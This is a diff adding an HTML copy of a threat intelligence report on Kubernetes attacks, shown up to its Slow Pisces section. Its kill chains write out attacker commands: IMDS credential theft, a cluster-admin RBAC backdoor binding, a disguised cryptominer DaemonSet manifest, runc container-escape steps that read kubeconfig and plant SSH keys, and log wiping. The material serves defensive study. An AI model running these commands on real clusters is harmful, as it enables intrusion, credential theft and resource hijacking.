@@ -1,0 +1,1971 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTI Research: Kubernetes & Cloud-Native Threat Landscape</title>
+  <meta name="author" content="Andrey Pautov">
+  <link rel='canonical' href='https://medium.com/bugbountywriteup/cti-research-kubernetes-cloud-native-threat-landscape-70373d6d7a87'>
+  <style>
+  :root {
+    font-family: "Georgia", "Times New Roman", serif;
+    line-height: 1.7;
+    color: #1a1a1a;
+    --toc-bg: #f8f9fa;
+    --border: #dee2e6;
+    --link: #0a5eb2;
+    --link-visited: #551a8b;
+    --code-bg: #f1f3f4;
+  }
+  body { margin: 0; padding: 0; max-width: 52rem; margin-left: auto; margin-right: auto; padding: 2rem 1.5rem 3rem; }
+  .doc-meta {
+    font-family: system-ui, -apple-system, sans-serif;
+    font-size: 0.875rem;
+    color: #495057;
+    margin-bottom: 2rem;
+    padding-bottom: 1rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .doc-meta a { color: var(--link); }
+  h1 { font-size: 1.75rem; font-weight: 700; margin-top: 0; margin-bottom: 0.5rem; border-bottom: 2px solid var(--border); padding-bottom: 0.5rem; }
+  h2 { font-size: 1.35rem; margin-top: 2.5rem; margin-bottom: 0.75rem; scroll-margin-top: 1rem; }
+  h3 { font-size: 1.15rem; margin-top: 1.75rem; margin-bottom: 0.5rem; }
+  h4 { font-size: 1.05rem; margin-top: 1.25rem; margin-bottom: 0.4rem; }
+  nav.toc { background: var(--toc-bg); border: 1px solid var(--border); border-radius: 6px; padding: 1rem 1.5rem; margin: 1.5rem 0 2rem; }
+  nav.toc ul { list-style: none; padding-left: 0; margin: 0; }
+  nav.toc li { margin: 0.4rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  a { color: var(--link); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  a:visited { color: var(--link-visited); }
+  code { font-family: "Consolas", "Monaco", monospace; background: var(--code-bg); padding: 0.15em 0.4em; border-radius: 3px; font-size: 0.88em; }
+  pre { background: var(--code-bg); border: 1px solid var(--border); border-radius: 5px; padding: 1rem 1.2rem; overflow-x: auto; }
+  pre code { background: none; padding: 0; font-size: 0.85em; }
+  table { border-collapse: collapse; width: 100%; margin: 1rem 0 1.5rem; font-size: 0.9em; }
+  th { background: #e9ecef; }
+  th, td { border: 1px solid var(--border); padding: 0.5rem 0.75rem; text-align: left; }
+  tr:nth-child(even) td { background: #f8f9fa; }
+  blockquote { border-left: 3px solid var(--border); margin: 1rem 0; padding: 0.5rem 1.2rem; color: #495057; font-style: italic; }
+  ul, ol { margin: 0.75rem 0 1.25rem 1.5rem; padding-left: 1.5rem; }
+  li { margin: 0.35rem 0; }
+  hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
+  p { margin: 0.75rem 0; }
+  .back-top { margin-top: 2.5rem; font-size: 0.9rem; color: #6c757d; }
+  @media print {
+    body { padding: 1rem; }
+    nav.toc { break-inside: avoid; }
+  }
+</style>
+</head>
+<body>
+  <header class="doc-meta">
+    <p>Author: <a href="https://medium.com/@1200km">Andrey Pautov</a>. <a href="https://medium.com/bugbountywriteup/cti-research-kubernetes-cloud-native-threat-landscape-70373d6d7a87">Published on Medium</a></p>
+  </header>
+  <h1 id="cti-research-kubernetes-cloud-native-threat-landscape">CTI Research: Kubernetes &amp; Cloud-Native Threat Landscape</h1>
+<p><em>Technical Kill Chain Analysis, Detection Engineering, and Defensive Architecture (2023 – Q2 2026)</em></p>
+<p><strong>Classification:</strong> TLP:WHITE — Unrestricted Distribution<br />
+<strong>Author:</strong> Andrey Pautov<br />
+<strong>Date:</strong> April 23, 2026<br />
+<strong>Assessment window:</strong> 2023 – Q2 2026<br />
+<strong>Evidence cutoff:</strong> April 23, 2026 (UTC)<br />
+<strong>Audience:</strong> CISO, Detection Engineers, SOC Analysts (Tier 2–3), Cloud Security Architects<br />
+<strong>Primary Sources:</strong> Sysdig TRT, Aqua Nautilus, Palo Alto Unit 42, Microsoft Threat Intelligence, CrowdStrike, NVD, AWS/Azure/GCP Documentation, SigmaHQ, Falco, Tetragon, CNCF</p>
+<hr />
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#purpose">Purpose</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#structure">Structure</a></li>
+<li><a href="#how-to-use-this-document">How to Use This Document</a></li>
+<li><a href="#methodology">Methodology</a></li>
+<li><a href="#evidence-labels-and-confidence">Evidence Labels and Confidence</a></li>
+<li><a href="#executive-summary">Executive Summary</a></li>
+<li><a href="#pillar-1-threat-actor-landscape--kill-chains">Pillar 1: Threat Actor Landscape &amp; Kill Chains</a></li>
+<li><a href="#11-threat-actor-taxonomy">1.1 Threat Actor Taxonomy</a></li>
+<li><a href="#12-scarleteel--cloud-intrusion-via-containerized-workload">1.2 SCARLETEEL — Cloud Intrusion via Containerized Workload</a></li>
+<li><a href="#13-teamtnt-rbac-buster--kubernetes-backdoor-campaign">1.3 TeamTNT RBAC Buster — Kubernetes Backdoor Campaign</a></li>
+<li><a href="#14-kinsing--persistent-opportunistic-cryptominer">1.4 Kinsing — Persistent Opportunistic Cryptominer</a></li>
+<li><a href="#15-slow-pisces--tradertraitor--dprk-crypto-theft-via-cloud-identity">1.5 Slow Pisces / TraderTraitor — DPRK Crypto-Theft via Cloud Identity</a></li>
+<li><a href="#16-famous-chollima--dprk-fake-worker--insider-access-cluster">1.6 FAMOUS CHOLLIMA — DPRK Fake-Worker / Insider-Access Cluster</a></li>
+<li><a href="#17-llmjacking--cloud-credential-abuse-against-ai-services">1.7 LLMjacking — Cloud Credential Abuse Against AI Services</a></li>
+<li><a href="#18-cve-2025-55182-react2shell--web-app-rce-as-a-kubernetes-foothold">1.8 CVE-2025-55182 React2Shell — Web-App RCE as a Kubernetes Foothold</a></li>
+<li><a href="#19-defense-evasion-memory-only-execution-and-log-tampering">1.9 Defense Evasion: Memory-Only Execution and Log Tampering</a></li>
+<li><a href="#pillar-2-telemetry-collection--visibility-architecture">Pillar 2: Telemetry Collection &amp; Visibility Architecture</a></li>
+<li><a href="#21-kubernetes-audit-log-architecture">2.1 Kubernetes Audit Log Architecture</a></li>
+<li><a href="#22-ebpf-runtime-telemetry">2.2 eBPF Runtime Telemetry</a></li>
+<li><a href="#23-telemetry-architecture-by-platform">2.3 Telemetry Architecture by Platform</a></li>
+<li><a href="#pillar-3-detection-engineering--parsers-as-code">Pillar 3: Detection Engineering &amp; "Parsers as Code"</a></li>
+<li><a href="#31-log-normalization-and-udm-mapping">3.1 Log Normalization and UDM Mapping</a></li>
+<li><a href="#32-detection-rule-1--privileged-pod-creation-sigma">3.2 Detection Rule 1 — Privileged Pod Creation, Non-System Namespaces (Backend-Dependent Sigma-Style Example)</a></li>
+<li><a href="#32b-detection-rule-1b--suspicious-privileged-daemonset-in-kube-system-sigma">3.2b Detection Rule 1b — Suspicious Privileged DaemonSet in kube-system (Backend-Dependent Sigma-Style Example)</a></li>
+<li><a href="#33-detection-rule-2--rbac-clusterrolebinding-backdoor-yara-l">3.3 Detection Rule 2 — RBAC ClusterRoleBinding Backdoor (YARA-L)</a></li>
+<li><a href="#34-detection-rule-3--exec-then-outbound--imds-access-elastic-eql">3.4 Detection Rule 3 — exec-then-Outbound / IMDS Access (Elastic EQL)</a></li>
+<li><a href="#35-detection-rule-4--privileged-pod-then-host-file-access-sigma-correlation">3.5 Detection Rule 4 — Privileged Pod then Host File Access (Sigma Correlation)</a></li>
+<li><a href="#pillar-4-defensive-architecture--hardening">Pillar 4: Defensive Architecture &amp; Hardening</a></li>
+<li><a href="#41-admission-controllers-enforce-before-scheduling">4.1 Admission Controllers: Enforce Before Scheduling</a></li>
+<li><a href="#42-network-policy-block-imds-and-constrain-egress">4.2 Network Policy: Block IMDS and Constrain Egress</a></li>
+<li><a href="#43-seccomp-and-apparmor-syscall-level-restriction">4.3 Seccomp and AppArmor: Syscall-Level Restriction</a></li>
+<li><a href="#44-rbac-hardening-minimize-service-account-token-exposure">4.4 RBAC Hardening: Minimize Service Account Token Exposure</a></li>
+<li><a href="#takeaways-for-the-soc">Takeaways for the SOC</a></li>
+<li><a href="#mitre-attck-mapping">MITRE ATT&amp;CK Mapping</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<hr />
+<h2 id="introduction">Introduction</h2>
+<h3 id="purpose">Purpose</h3>
+<p>This report is a practitioner-grade Cyber Threat Intelligence document covering the Kubernetes and cloud-native threat landscape from 2023 through Q2 2026. It is designed for direct operational use: detection engineers building or tuning analytic rules, SOC analysts (Tier 2–3) triaging Kubernetes-related alerts, cloud security architects evaluating control posture, and CISOs reviewing coverage against documented adversary patterns.</p>
+<p>The document does not survey Kubernetes security in the abstract. It is grounded in named, sourced threat actor campaigns and real vulnerabilities with confirmed exploitation paths. Every claim carries an explicit evidence label. Every detection rule includes explicit backend dependencies, normalization requirements, and portability caveats. Every defensive control section states what it blocks, what it does not block, and which platform constraints apply. Content presented without a primary source is labeled <strong>Assessed</strong> or <strong>Inferred</strong> and is distinguished from directly observed technical evidence.</p>
+<h3 id="scope">Scope</h3>
+<p><strong>Assessment window:</strong> 2023 – Q2 2026<br />
+<strong>Evidence cutoff:</strong> April 23, 2026 (UTC)</p>
+<p>The report covers:</p>
+<ul>
+<li><strong>Threat actor kill chains</strong>: six named clusters (SCARLETEEL, TeamTNT RBAC Buster, Kinsing, Slow Pisces / TraderTraitor, FAMOUS CHOLLIMA, LLMjacking operators) plus CVE-2025-55182 (React2Shell) as a concrete foothold vector, and a cross-actor analysis of defense evasion techniques</li>
+<li><strong>Telemetry architecture</strong>: Kubernetes API audit logs, eBPF-based runtime telemetry (Falco, Tetragon, Tracee), and platform-specific collection constraints across EKS, AKS, GKE, EKS Auto Mode, and AWS Fargate</li>
+<li><strong>Detection engineering</strong>: four production-oriented detection rules (Sigma, YARA-L / Chronicle, Elastic EQL) with explicit normalization requirements, backend dependencies, and a Sigma correlation rule; all rules are explicitly labeled by portability and environment-sensitivity</li>
+<li><strong>Defensive controls</strong>: admission control policy (Kyverno), network policy (Cilium, Kubernetes NetworkPolicy), syscall restriction (Seccomp, AppArmor), RBAC hardening, and OPA Gatekeeper constraint policy</li>
+</ul>
+<p><strong>Out of scope:</strong> General Kubernetes operational hardening not tied to documented adversary techniques; managed Kubernetes control-plane internals beyond what is observable from audit logs; offensive tooling development.</p>
+<h3 id="structure">Structure</h3>
+<p>The report is organized around four interdependent pillars:</p>
+<table>
+<thead>
+<tr>
+<th>Pillar</th>
+<th>Content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Pillar 1 — Threat Actor Landscape &amp; Kill Chains</strong></td>
+<td>Named actor profiles with sourced kill chains, ATT&amp;CK mappings, and evidence labels. Establishes what adversaries actually do and what artifacts they leave.</td>
+</tr>
+<tr>
+<td><strong>Pillar 2 — Telemetry Collection &amp; Visibility Architecture</strong></td>
+<td>What logs and signals exist, how to enable them, where platform constraints create blind spots. Detection rules in Pillar 3 are only meaningful against the collection model described here.</td>
+</tr>
+<tr>
+<td><strong>Pillar 3 — Detection Engineering</strong></td>
+<td>Four detection rules derived directly from Pillar 1 kill chains. Each rule is paired with its normalization dependencies, backend constraints, and a statement of what it cannot detect.</td>
+</tr>
+<tr>
+<td><strong>Pillar 4 — Defensive Architecture &amp; Hardening</strong></td>
+<td>Controls that prevent or constrain the techniques in Pillar 1. Each control section is explicit about coverage boundaries and does not overstate prevention where the sample policy provides detection only.</td>
+</tr>
+</tbody>
+</table>
+<p>The Takeaways section at the end synthesizes the ten highest-leverage actions derived from the full analysis, ordered by expected impact on detection coverage and adversary friction.</p>
+<h3 id="how-to-use-this-document">How to Use This Document</h3>
+<p><strong>Detection engineers</strong> should read Pillar 2 before Pillar 3. The detection rules assume a specific telemetry model; deploying rules without the corresponding collection pipeline produces silent failures, not false positives. Each rule's <em>Assumptions / normalization dependencies</em> block is the prerequisite checklist.</p>
+<p><strong>SOC analysts</strong> should use the kill chain sections (1.2–1.9) as behavioral context for alert triage, and the ATT&amp;CK mapping table as a lookup when a technique ID appears in an alert. The Takeaways section provides the prioritized SOC action list.</p>
+<p><strong>Security architects</strong> should use Pillar 4 in conjunction with the control coverage gaps noted in Pillar 1. The Kyverno and OPA Gatekeeper policies are starting points, not drop-in production controls; each includes an explicit statement of what the sample policy does not enforce.</p>
+<p><strong>CISOs</strong> can begin with the Executive Summary and Takeaways, then use the ATT&amp;CK mapping table to assess which documented adversary techniques are covered, partially covered, or not addressed by current controls.</p>
+<h3 id="methodology">Methodology</h3>
+<p>Source material is drawn exclusively from named primary sources: vendor threat research reports, NVD advisories, and platform provider documentation. No claims are derived from secondary or anonymous reporting without an independent primary source being available. The evidence label model (Observed / Reported / Assessed / Inferred / Claimed) is defined in the next section and applied consistently throughout the document.</p>
+<p>Detection rules and defensive configurations were reviewed across multiple revision cycles for technical accuracy, including syntax validation, portability scope, and control-boundary honesty. Rules known to require environment-specific tuning are marked as such and are not presented as generic baselines.</p>
+<hr />
+<h2 id="evidence-labels-and-confidence">Evidence Labels and Confidence</h2>
+<p>All substantive claims in this document carry one of the following labels. Inline citations follow every labeled claim.</p>
+<table>
+<thead>
+<tr>
+<th>Label</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Observed</strong></td>
+<td>Technical artifact available in a named primary source: sample, pcap, config, telemetry</td>
+</tr>
+<tr>
+<td><strong>Reported</strong></td>
+<td>Documented by a named authoritative vendor; full victim-side telemetry not fully public</td>
+</tr>
+<tr>
+<td><strong>Assessed</strong></td>
+<td>Analytical conclusion synthesized from multiple Observed/Reported items; not standalone proof</td>
+</tr>
+<tr>
+<td><strong>Inferred</strong></td>
+<td>Logical deduction from established facts; no direct primary source; may be wrong</td>
+</tr>
+<tr>
+<td><strong>Claimed</strong></td>
+<td>Vendor or actor assertion without independent technical validation</td>
+</tr>
+</tbody>
+</table>
+<p>Every code example is either syntactically valid for its named target platform or explicitly labeled <strong>[PSEUDOCODE]</strong> or <strong>[PARSER-SPECIFIC EXAMPLE]</strong>. Detection rules include an <em>Assumptions / normalization dependencies</em> note. Mitigation sections include <em>What this blocks</em>, <em>What this does not block</em>, and <em>Platform caveats</em>.</p>
+<hr />
+<h2 id="executive-summary">Executive Summary</h2>
+<p>Kubernetes has become the dominant container orchestration platform, and adversarial targeting has grown proportionally. Microsoft Threat Intelligence noted that <strong>51% of workload identities were found completely inactive</strong>, creating a persistent attack surface that threat actors exploit by operating under dormant, unmonitored credentials <a href="https://www.microsoft.com/en-us/security/blog/2025/04/23/understanding-the-threat-landscape-for-kubernetes-and-containerized-assets/">[R1]</a>.</p>
+<p>The threat landscape has matured from opportunistic cryptomining toward multi-stage cloud intrusions. SCARLETEEL, documented by Sysdig TRT, pivoted from a Kubernetes pod into AWS IAM and across multiple accounts via a Terraform state file, exfiltrating over 1 TB of proprietary data <a href="https://sysdig.com/blog/cloud-breach-terraform-data-theft">[R2]</a>. Palo Alto Unit 42 attributed a 2025 cryptocurrency exchange intrusion — in which Kubernetes post-exploitation was a pivot layer — to North Korea's Lazarus Group (tracked as Slow Pisces / TraderTraitor) <a href="https://unit42.paloaltonetworks.com/modern-kubernetes-threats/">[R3]</a>. CrowdStrike separately documented FAMOUS CHOLLIMA, a distinct DPRK-linked cluster focused on fraudulent employment rather than technical exploitation <a href="https://www.crowdstrike.com/en-us/resources/reports/threat-hunting-report/">[R4]</a>. Sysdig documented LLMjacking: stolen cloud credentials abused against hosted AI inference services, with victim costs reported up to $100,000 per day — a pattern that can intersect Kubernetes environments but is not inherently Kubernetes-native <a href="https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack/">[R5]</a>.</p>
+<p>Three runc vulnerabilities — CVE-2025-31133, CVE-2025-52565, and CVE-2025-52881 — disclosed in late 2025 demonstrate that the container isolation boundary remains an active research and exploitation target, each under specific local/container-context prerequisites <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31133">[R6]</a>. The earlier CVE-2024-21626 ("Leaky Vessels") exposed a file-descriptor-leak escape path in runc through v1.1.11 <a href="https://www.wiz.io/vulnerability-database/cve/cve-2024-21626">[R7]</a>.</p>
+<p>Effective detection requires layering Kubernetes API audit logs — which must be explicitly configured, with enablement procedures varying by managed service — with eBPF-based or equivalent kernel-level runtime telemetry (Falco, Tetragon), then normalizing both streams to a common schema before correlation. Neither source alone produces high-confidence detections for the behavioral patterns documented in this report.</p>
+<hr />
+<h2 id="pillar-1-threat-actor-landscape-kill-chains">Pillar 1: Threat Actor Landscape &amp; Kill Chains</h2>
+<h3 id="11-threat-actor-taxonomy">1.1 Threat Actor Taxonomy</h3>
+<table>
+<thead>
+<tr>
+<th>Actor</th>
+<th>Motivation</th>
+<th>Signature Technique</th>
+<th>Attribution</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SCARLETEEL</strong></td>
+<td>Data theft, cryptomining</td>
+<td>K8s → AWS IAM pivot via IMDS and Terraform state</td>
+<td>Financially motivated intrusion set (Assessed; Sysdig TRT <a href="https://sysdig.com/blog/cloud-breach-terraform-data-theft">[R2]</a>)</td>
+</tr>
+<tr>
+<td><strong>TeamTNT / RBAC Buster</strong></td>
+<td>Cryptomining, persistence</td>
+<td>Exposed API server, ClusterRoleBinding backdoor</td>
+<td>Cybercrime cluster (Reported; Aqua Nautilus <a href="https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/">[R8]</a>)</td>
+</tr>
+<tr>
+<td><strong>Kinsing</strong></td>
+<td>Cryptomining</td>
+<td>Exposed Docker API, PostgreSQL RCE, userland rootkit</td>
+<td>Cybercrime (Observed/Reported; Microsoft, Aqua <a href="https://techcommunity.microsoft.com/blog/microsoftdefendercloudblog/initial-access-techniques-in-kubernetes-environments-used-by-kinsing-malware/3697975">[R9]</a>)</td>
+</tr>
+<tr>
+<td><strong>Slow Pisces / TraderTraitor</strong></td>
+<td>Cryptocurrency theft, espionage</td>
+<td>K8s identity pivot, cloud credential abuse</td>
+<td>DPRK state-sponsored (Attributed; Unit 42 <a href="https://unit42.paloaltonetworks.com/modern-kubernetes-threats/">[R3]</a>)</td>
+</tr>
+<tr>
+<td><strong>FAMOUS CHOLLIMA</strong></td>
+<td>Fraudulent employment, insider access</td>
+<td>Fake-worker personas, hands-on-keyboard with legitimate tools</td>
+<td>DPRK-nexus (Attributed; CrowdStrike <a href="https://www.crowdstrike.com/en-us/resources/reports/threat-hunting-report/">[R4]</a>)</td>
+</tr>
+<tr>
+<td><strong>LLMjacking operators</strong></td>
+<td>Cloud resource hijacking</td>
+<td>Stolen API keys, cloud credential abuse against AI services</td>
+<td>Financially motivated (Assessed; Sysdig <a href="https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack/">[R5]</a>)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Note:</strong> Slow Pisces/TraderTraitor and FAMOUS CHOLLIMA are distinct DPRK-linked clusters with different tradecraft profiles and should not be merged into a single narrative. They are addressed in separate subsections below.</p>
+</blockquote>
+<hr />
+<h3 id="12-scarleteel-cloud-intrusion-via-containerized-workload">1.2 SCARLETEEL — Cloud Intrusion via Containerized Workload</h3>
+<p><strong>Evidence label:</strong> Reported (primary source: Sysdig TRT <a href="https://sysdig.com/blog/cloud-breach-terraform-data-theft">[R2]</a>)</p>
+<p>SCARLETEEL is documented by Sysdig TRT as a financially motivated intrusion set — not labeled an APT in the primary reporting. Sysdig reported exfiltration of over <strong>1 TB of proprietary customer data</strong> <a href="https://sysdig.com/blog/cloud-breach-terraform-data-theft">[R2]</a>.</p>
+<h4 id="kill-chain-reported-r2">Kill Chain (Reported <a href="https://sysdig.com/blog/cloud-breach-terraform-data-theft">[R2]</a>)</h4>
+<pre><code>Phase 1 — Initial Access: Vulnerable Public-Facing Application (T1190)
+  └─ Target: JupyterLab notebook container, public-facing, no authentication
+  └─ Data science workloads frequently carry excessive IAM permissions
+     and weak or absent authentication
+
+Phase 2 — Execution and Enumeration (T1610, T1083)
+  └─ Deploy cryptominer as a cover action
+  └─ Enumerate environment variables for cloud credentials
+  └─ Deploy Peirates (open-source Kubernetes pentest tool)
+  └─ Query Kubernetes API server using the auto-mounted SA token
+
+Phase 3 — Cloud Credential Theft via IMDS (T1552.001, T1552.005)
+  └─ HTTP GET to AWS IMDS:
+      http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;
+  └─ Validate credential validity: aws sts get-caller-identity
+
+Phase 4 — Cloud Privilege Escalation (T1078.004)
+  └─ Enumerate EC2, Lambda, IAM using the stolen IAM role
+  └─ Discover Terraform state file in an S3 bucket
+      → State file contains plaintext credentials and cross-account trust data
+
+Phase 5 — Lateral Movement Across AWS Accounts (T1550.001)
+  └─ AssumeRole into connected AWS accounts using Terraform-exposed trusts
+
+Phase 6 — Data Exfiltration and Persistence (T1537, T1098.001)
+  └─ Exfiltrate S3 objects, source code, .git-credentials
+  └─ Exfiltration via Bash /dev/tcp built-in — does not spawn curl/wget
+  └─ Data encoded in memory variable (SEND_B64_DATA), sent to external endpoint
+  └─ Persist via Lambda backdoors and secondary IAM user creation
+</code></pre>
+<p><strong>Defense evasion TTPs (Observed <a href="https://sysdig.com/blog/cloud-breach-terraform-data-theft">[R2]</a>):</strong><br />
+- Executed <code>rm /var/log/syslog</code> repeatedly to destroy agent-based log forwarder data before it was shipped<br />
+- Used <code>history -cw</code> and <code>clear</code> to erase shell forensic trail<br />
+- Used Bash <code>/dev/tcp</code> built-in rather than <code>curl</code>/<code>wget</code> to avoid spawning processes that trigger tool-execution behavioral rules</p>
+<p><strong>ATT&amp;CK Mappings:</strong> <code>T1190</code>, <code>T1610</code>, <code>T1083</code>, <code>T1552.001</code>, <code>T1552.005</code>, <code>T1078.004</code>, <code>T1537</code>, <code>T1098.001</code>, <code>T1027</code>, <code>T1070.003</code></p>
+<hr />
+<h3 id="13-teamtnt-rbac-buster-kubernetes-backdoor-campaign">1.3 TeamTNT RBAC Buster — Kubernetes Backdoor Campaign</h3>
+<p><strong>Evidence label:</strong> Reported (primary source: Aqua Nautilus <a href="https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/">[R8]</a>)</p>
+<p>Aqua Nautilus documented this campaign using Kubernetes honeypots over a three-month period. 350+ production clusters were found openly accessible; at least 60% were already compromised and running active malware at the time of discovery <a href="https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/">[R8]</a>. The RBAC Buster technique creates a persistent backdoor that survives remediation of the original misconfiguration.</p>
+<h4 id="kill-chain-reported-r8">Kill Chain (Reported <a href="https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/">[R8]</a>)</h4>
+<pre><code>Phase 1 — Initial Access: Exposed Kubernetes API Server (T1190)
+  └─ Target: clusters with --anonymous-auth=true or absent RBAC policy
+  └─ Discovery: Shodan/Censys queries for ports 6443 (HTTPS), 8080 (legacy)
+  └─ Verify unauthenticated access:
+      curl -k https://&lt;target&gt;:6443/api/v1/namespaces
+
+Phase 2 — RBAC Backdoor Creation (T1098)
+  └─ Create ClusterRoleBinding granting cluster-admin to attacker SA:
+      kubectl create clusterrolebinding backdoor \
+        --clusterrole=cluster-admin \
+        --serviceaccount=kube-system:attacker-sa
+  └─ This binding persists even if the original misconfiguration is closed
+
+Phase 3 — Persistence via DaemonSet (T1053.007)
+  └─ Deploy DaemonSet with name mirroring kube-proxy
+  └─ Container: XMRig Monero miner in kube-system namespace
+  └─ hostPID: true, hostNetwork: true, privileged: true
+
+Phase 4 — Defense Evasion (T1036)
+  └─ Namespace: kube-system (hides among platform components)
+  └─ Image name mimics a legitimate kube-proxy component
+  └─ Removes competing malware to maximise resource availability
+
+Phase 5 — Impact (T1496 — Resource Hijacking)
+  └─ XMRig configured to pool.hashvault.pro
+  └─ No resource limits — maximizes mining throughput
+</code></pre>
+<p><strong>Reconstructed DaemonSet manifest (threat intelligence artifact — do not deploy):</strong></p>
+<pre><code class="language-yaml"># Reconstructed from Aqua Nautilus honeypot analysis [R8]
+# FOR REFERENCE ONLY
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: kube-proxy-manager
+  namespace: kube-system
+  labels:
+    k8s-app: kube-proxy
+spec:
+  selector:
+    matchLabels:
+      k8s-app: kube-proxy
+  template:
+    spec:
+      hostPID: true
+      hostNetwork: true
+      tolerations:
+      - key: node-role.kubernetes.io/master
+        effect: NoSchedule
+      containers:
+      - name: kube-proxy
+        image: xmrig/xmrig:latest
+        args: [&quot;--pool=pool.hashvault.pro:443&quot;, &quot;--user=&lt;wallet&gt;&quot;, &quot;--tls&quot;]
+        securityContext:
+          privileged: true
+        resources: {}
+</code></pre>
+<p><strong>ATT&amp;CK Mappings:</strong> <code>T1190</code>, <code>T1098</code>, <code>T1053.007</code>, <code>T1036</code>, <code>T1496</code></p>
+<hr />
+<h3 id="14-kinsing-persistent-opportunistic-cryptominer">1.4 Kinsing — Persistent Opportunistic Cryptominer</h3>
+<p><strong>Evidence label:</strong> Observed/Reported (primary sources: Microsoft <a href="https://techcommunity.microsoft.com/blog/microsoftdefendercloudblog/initial-access-techniques-in-kubernetes-environments-used-by-kinsing-malware/3697975">[R9]</a>, Aqua Nautilus <a href="https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/">[R8]</a>, Wiz <a href="https://www.wiz.io/vulnerability-database/cve/cve-2024-21626">[R7]</a>)</p>
+<p>Kinsing has been tracked since 2019 and continues to evolve. Its userland rootkit, which hooks <code>ps</code>, <code>ls</code>, and <code>netstat</code> output, is the primary reason kernel-level telemetry is operationally necessary in environments where Kinsing activity is a concern.</p>
+<p><strong>Initial access vectors (Observed):</strong><br />
+1. Docker/containerd API exposed on TCP 2375 without TLS or authentication<br />
+2. PostgreSQL with <code>trust</code> authentication in <code>pg_hba.conf</code>, leading to <code>COPY TO/FROM PROGRAM</code> RCE</p>
+<p><strong>CVE-2024-21626 — container escape via runc file descriptor leak:</strong></p>
+<p>CVE-2024-21626 is a file-descriptor leak in runc through v1.1.11, disclosed January 2024 <a href="https://www.wiz.io/vulnerability-database/cve/cve-2024-21626">[R7]</a>. The vulnerability requires that an attacker control the container image (specifically the <code>WORKDIR</code> directive) or the <code>kubectl exec</code> arguments, and that the host is running a vulnerable runc version.</p>
+<blockquote>
+<p><strong>Attribution caveat (Assessed):</strong> The CVE is presented here because it is relevant to the Kinsing toolset profile and to container runtime hardening generally. Direct evidence that Kinsing specifically weaponized CVE-2024-21626 in confirmed production campaigns is not established in the primary sources reviewed for this paper. The actor-to-CVE linkage should be treated as Assessed, not Observed.</p>
+</blockquote>
+<p><strong>CVE-2024-21626 escape path (Reported <a href="https://www.wiz.io/vulnerability-database/cve/cve-2024-21626">[R7]</a>):</strong></p>
+<pre><code>Prerequisites:
+  - Vulnerable runc version (≤ v1.1.11) on the container host
+  - Attacker controls container image or kubectl exec session
+
+Attack path:
+  1. Container WORKDIR is set to a leaked runc file descriptor path:
+       WORKDIR /proc/self/fd/&lt;leaked_fd&gt;
+     The leaked fd references a host directory at container start time.
+
+  2. Container process begins with its CWD resolved to a host path.
+
+  3. Path traversal breaks out of the container root:
+       cd ../../../../..
+
+  4. Attacker reads or writes host-sensitive files:
+       cat /var/lib/kubelet/kubeconfig
+       echo &lt;key&gt; &gt;&gt; /root/.ssh/authorized_keys
+</code></pre>
+<p><strong>Mitigation for CVE-2024-21626:</strong> Upgrade runc to v1.1.12 or later. Applying a Seccomp profile that restricts relevant mount and procfs syscalls reduces exploitability. Denying <code>hostPath</code> volumes does <strong>not</strong> mitigate this vulnerability; the escape uses runc's internal file descriptor, not a mounted host path.</p>
+<p><strong>Post-compromise behavior (Observed <a href="https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/">[R8]</a>, <a href="https://techcommunity.microsoft.com/blog/microsoftdefendercloudblog/initial-access-techniques-in-kubernetes-environments-used-by-kinsing-malware/3697975">[R9]</a>):</strong><br />
+- Userland rootkit hooks <code>ps</code>, <code>ls</code>, <code>netstat</code> output to hide miner processes from userspace enumeration tools<br />
+- SSH key injection into <code>~/.ssh/authorized_keys</code> for persistent host access<br />
+- Internal network scanning targeting additional Docker APIs and Kubernetes nodes<br />
+- Active removal of competing malware (Kinsing and TeamTNT contest the same hosts)</p>
+<p><strong>ATT&amp;CK Mappings:</strong> <code>T1190</code>, <code>T1611</code>, <code>T1014</code>, <code>T1098.004</code>, <code>T1046</code>, <code>T1496</code></p>
+<hr />
+<h3 id="15-slow-pisces-tradertraitor-dprk-crypto-theft-via-cloud-identity">1.5 Slow Pisces / TraderTraitor — DPRK Crypto-Theft via Cloud Identity</h3>
+<p><strong>Evidence label:</strong> Reported (primary source: Palo Alto Unit 42 <a href="https://unit42.paloaltonetworks.com/modern-kubernetes-threats/">[R3]</a>)<br />
+<strong>Attribution:</strong> North Korean state-sponsored; tracked by Unit 42 as Slow Pisces and by FBI/CISA as TraderTraitor <a href="https://unit42.paloaltonetworks.com/modern-kubernetes-threats/">[R3]</a>.</p>
+<p>Unit 42 documented a 2025 intrusion at a cryptocurrency exchange in which a Kubernetes environment served as a post-exploitation pivot layer. Losses were assessed at approximately $1.5 billion in Ethereum <a href="https://unit42.paloaltonetworks.com/modern-kubernetes-threats/">[R3]</a>. This campaign illustrates that Kubernetes is targeted as an identity transit layer in DPRK financial operations.</p>
